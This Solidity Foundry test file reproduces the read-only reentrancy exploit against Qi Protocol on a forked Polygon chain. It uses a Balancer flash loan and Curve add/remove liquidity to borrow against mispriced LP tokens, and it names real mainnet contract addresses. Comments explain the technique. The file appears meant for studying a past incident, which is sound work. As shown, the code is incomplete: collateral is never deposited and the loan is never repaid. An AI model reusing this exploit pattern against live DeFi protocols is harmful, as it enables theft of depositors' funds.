// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";

import {BalancerFlashloan} from "../../utils/BalancerFlashloan.sol";

import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external payable returns(uint256[] memory);
    function exitMarket(address market) external;

    // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to unlimited borrowing.
    function borrowCaps(address market) external view returns(uint256);
}

interface ICERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 min_min_amount, bool use_eth) external payable returns(uint256);
    function remove_liquidity(uint256 amount, uint256[2] calldata min_amounts , bool use_eth) external payable returns(uint256);
    function token() external pure returns (address);
}

contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
    ICERC20Delegator DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);

    // STLidoMatic/WMATIC Curve pool
    ICurvePool constant CURVE_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    IERC20 CURVE_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);

    // In reality, the attacker used some minion contracts which they deployed from their
    // main contract to execute the attacks. Here, we simplify and use only one contract
    // and reproduce the attack only to Qi Protocol.
    // The attacker minion address can be found at
    // https://polygonscan.com/address/0x8d1e7cE7DbB14aFB8782EaEa8010938cC457115e
    function setUp() external {
        cheat.createSelectFork("polygon", 34716801); // We pin one block before the exploit happened.
        cheat.label(address(this), "Attacker Contract");
        cheat.label(address(CURVE_POOL), "Curve Pool");
        cheat.label(address(CURVE_LP_TOKEN), "LP Token");
    }

    function test_attack() external {

        // In reality, the attacker requested a flash loan through AAVE
        // first and then through Balancer. This is not terribly important
        // for the attack, so it was left out for simplicity.
        // The difference it makes is that in the actual attack the attacker
        // had 50000000000000000000000000 of stLIDOMATIC because they requested
        // first 15419963467577188022568076 and then 34580036532422811977431924
        address[] memory _tokens = new address[](2);
        _tokens[0] = address(WMATIC);
        _tokens[1] = address(stLIDOMATIC);

        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = 34580036532422811977431924;
        _amounts[1] = 19664260000000000000000000;

        balancer.flashLoan(address(this), _tokens, _amounts, "");
    }

    fallback() external payable {
        _fallback();
    }

    receive() external payable {
        _fallback();
    }

    function _fallback() internal {
        // During the fallback, the LP token price
        // will be broken if we consult `get_virtual_price`
        // Our friends at Qi use this, so we can exploit them
        // Here we should continue the attack: we should send the LP tokens
        // to the borrow platform, which should price them a lot more
        // than they are. Once we get our borrow, repay the flashloan
        // and finish

        console.log("STARTING BORROW");
        DELEGATOR.borrow(249000000000000000000000);
    }


    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory ,
        bytes memory
    ) external payable {
        require(msg.sender == address(balancer), "only callable by balancer");
        require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
        require(address(tokens[0]) == address(WMATIC));
        require(address(tokens[1]) == address(stLIDOMATIC));

        console.log(amounts[0]);
        console.log(amounts[1]);


        // Add to the pool all my WMATIC and stLIDOMATIC, I will
        // receive LP tokens in return
        WMATIC.approve(address(CURVE_POOL), amounts[0]);
        stLIDOMATIC.approve(address(CURVE_POOL), amounts[1]);

        uint256[2] memory addLiquidityAmounts = [amounts[1],
                                                 amounts[0]];
        uint256 lp_tokens = CURVE_POOL.add_liquidity(addLiquidityAmounts, 0, false);

        console.log(CURVE_LP_TOKEN.balanceOf(address(this)));
        assertGe(CURVE_LP_TOKEN.balanceOf(address(this)), 0);

        // Let's now remove liquidity, which will trigger our fallback function
        uint256[2] memory minAmounts = [ uint256(0) ,uint256(0) ];
        CURVE_POOL.remove_liquidity(lp_tokens, minAmounts, true);
        console.log("finished");

    }

}
